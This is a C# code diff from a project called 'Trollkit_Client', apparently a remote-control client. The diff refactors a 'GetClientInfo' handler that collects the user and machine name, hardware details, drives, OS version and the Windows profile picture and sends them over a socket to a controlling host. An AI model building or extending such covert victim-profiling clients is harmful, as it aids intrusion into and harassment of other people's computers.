@@ -25,44 +25,111 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			switch (obj.Command)
 			{
 				case "GetClientInfo":
-					CollectAndReturnSystemInfo(s);
-					return true;
+					return CollectAndReturnSystemInfo(s);
 			}
 
 			return false;
 		}
 
-		private void CollectAndReturnSystemInfo(Socket s)
+		/// <summary>
+		/// Function that executes all functions and then returns their data to the Host
+		/// </summary>
+		/// <param name="s"></param>
+		/// <returns></returns>
+		private bool CollectAndReturnSystemInfo(Socket s)
 		{
-			string userName = $"> {Environment.UserName} on {Environment.MachineName}";
-			TransferCommandObject userNameTransferObject = new TransferCommandObject { Command = "ComputerName", Value = userName };
-			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(userNameTransferObject));
+			bool success = true;
+			try
+			{
+				string userName = $"> {Environment.UserName} on {Environment.MachineName}";
+				TransferCommandObject userNameTransferObject = new TransferCommandObject { Command = "ComputerName", Value = userName };
+				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(userNameTransferObject));
+			}
+			catch (Exception e)
+			{
+				success = false;
+				BConsole.WriteLine("ComputerName error: " + e.Message, ConsoleColor.Red);
+			}
 
-			string cpu = GetCPUName();
-			TransferCommandObject cpuTranfserObject = new TransferCommandObject { Command = "CPU", Value = cpu };
-			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(cpuTranfserObject));
+			try
+			{
+				string cpu = GetCPUName();
+				TransferCommandObject cpuTranfserObject = new TransferCommandObject { Command = "CPU", Value = cpu };
+				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(cpuTranfserObject));
+			}
+			catch (Exception e)
+			{
+				success = false;
+				BConsole.WriteLine("CPU error: " + e.Message, ConsoleColor.Red);
+			}
 
-			string drives = GetSystemDrives();
-			TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Value = drives };
-			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));
+			try
+			{
+				string drives = GetSystemDrives();
+				TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Value = drives };
+				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));
+			}
+			catch (Exception e)
+			{
+				success = false;
+				BConsole.WriteLine("Drives error: " + e.Message, ConsoleColor.Red);
+			}
 
-			string base64ProfilePicture = WindowsProfilePicture.Get448ImageString();
-			TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
-			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
+			try
+			{
+				string base64ProfilePicture = WindowsProfilePicture.Get448ImageString();
+				TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
+				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
+			}
+			catch (Exception e)
+			{
+				success = false;
+				BConsole.WriteLine("ProfilePicture error: " + e.Message, ConsoleColor.Red);
+			}
 
-			string osVersion = GetOSVersion();
-			TransferCommandObject osVersionTransferObject = new TransferCommandObject { Command = "WindowsVersion", Value = osVersion };
-			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(osVersionTransferObject));
+			try
+			{
+				string osVersion = GetOSVersion();
+				TransferCommandObject osVersionTransferObject = new TransferCommandObject { Command = "WindowsVersion", Value = osVersion };
+				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(osVersionTransferObject));
+			}
+			catch (Exception e)
+			{
+				success = false;
+				BConsole.WriteLine("WindowsVersion error: " + e.Message, ConsoleColor.Red);
+			}
 
-			string gpuName = GetGPUName();
-			TransferCommandObject gpuNameTransferObject = new TransferCommandObject { Command = "GPU", Value = gpuName };
-			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(gpuNameTransferObject));
+			try
+			{
+				string gpuName = GetGPUName();
+				TransferCommandObject gpuNameTransferObject = new TransferCommandObject { Command = "GPU", Value = gpuName };
+				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(gpuNameTransferObject));
+			}
+			catch (Exception e)
+			{
+				success = false;
+				BConsole.WriteLine("GPU error: " + e.Message, ConsoleColor.Red);
+			}
 
-			string ramString = GetRamAmount();
-			TransferCommandObject ramTransferObject = new TransferCommandObject { Command = "RAM", Value = ramString };
-			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(ramTransferObject));
+			try
+			{
+				string ramString = GetRamAmount();
+				TransferCommandObject ramTransferObject = new TransferCommandObject { Command = "RAM", Value = ramString };
+				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(ramTransferObject));
+			}
+			catch (Exception e)
+			{
+				success = false;
+				BConsole.WriteLine("RAM error: " + e.Message, ConsoleColor.Red);
+			}
+
+			return success;
 		}
 		
+		/// <summary>
+		/// Function that gets the amount of RAM in the system
+		/// </summary>
+		/// <returns></returns>
 		private string GetRamAmount()
 		{
 			try
@@ -78,6 +145,10 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			}
 		}
 
+		/// <summary>
+		/// Function that gets the GPU Name from the Registry
+		/// </summary>
+		/// <returns></returns>
 		private string GetGPUName()
 		{
 			try
@@ -115,8 +186,10 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			return "Unknown GPU";
 		}
 
-
-
+		/// <summary>
+		/// Function that gets the CPU Name from the Registry
+		/// </summary>
+		/// <returns></returns>
 		private string GetCPUName()
 		{
 			try
@@ -136,6 +209,10 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			return "Unknown Processor";
 		}
 
+		/// <summary>
+		/// Function that gets the windows version from the Registry
+		/// </summary>
+		/// <returns></returns>
 		private string GetOSVersion()
 		{
 			RegistryKey key;
@@ -170,6 +247,10 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			return "Unknown OS Version";
 		}
 
+		/// <summary>
+		/// Function that gets and returns all the system drives
+		/// </summary>
+		/// <returns></returns>
 		private string GetSystemDrives()
 		{
 			try
